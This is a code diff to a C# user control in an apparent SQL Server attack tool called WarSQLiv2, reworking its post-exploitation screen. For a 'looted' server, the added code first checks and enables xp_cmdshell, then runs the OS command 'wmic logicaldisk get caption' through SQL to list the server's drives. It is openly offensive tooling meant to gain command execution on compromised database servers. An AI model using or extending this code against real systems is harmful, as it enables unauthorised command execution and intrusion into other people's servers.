@@ -63,27 +63,56 @@ namespace WarSQLiv2.UserControls.Attack.MSSQL
                     lblStrip.Content = string.Empty;
                     lblStrip.Content = toolStripControl.SqlServerInfo;
                 });
-                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                var isActivated = cmdControl.isActivated;
+                var isExecuted = cmdControl.isExecuted;
+                if (isActivated == false && isExecuted == false)
                 {
+                    var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                     try
                     {
-                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
-                        _postExploitation.SqlCommand = "wmic logicaldisk get caption";
-                        _postExploitation.SqlExploitation();
-                        lstDirectory.Items.Clear();
-                        for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
+                        Dispatcher.Invoke((Action)delegate
                         {
-                            lstDirectory.Items.Add(_postExploitation.VolumeList[i]);
-                            lstDirectory.Items.Remove("");
-                        }
+                            enableXpCmdShell.XpCmdShellStatus();
+                            txtStatus.AppendText(enableXpCmdShell.Result);
+                            var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
+                            var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
+                            if (contains == true)
+                            {
+                                isActivated = true;
+                                isExecuted = true;
+                            }
+                        });
                     }
-                    catch (Exception exp)
+                    catch (Exception)
                     {
-                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                        {
+                            txtStatus.AppendText(enableXpCmdShell.CmdException);
+                        });
                     }
-                });
-                
-
+                }
+                if (isExecuted == true && isActivated == true)
+                {
+                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
+                    {
+                        try
+                        {
+                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
+                            _postExploitation.SqlCommand = "wmic logicaldisk get caption";
+                            _postExploitation.SqlExploitation();
+                            lstDirectory.Items.Clear();
+                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
+                            {
+                                lstDirectory.Items.Add(_postExploitation.VolumeList[i]);
+                                lstDirectory.Items.Remove("");
+                            }
+                        }
+                        catch (Exception exp)
+                        {
+                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
+                        }
+                    });
+                }
             }
             catch (Exception exp)
             {
